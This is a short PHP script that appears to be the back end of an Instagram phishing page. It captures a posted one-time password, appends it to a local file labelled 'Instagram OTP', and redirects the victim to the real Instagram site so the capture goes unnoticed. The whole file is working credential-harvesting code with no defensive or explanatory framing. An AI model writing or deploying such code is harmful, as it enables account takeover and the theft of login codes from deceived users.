<?php
file_put_contents("otp.txt", "Instagram OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/');
?>
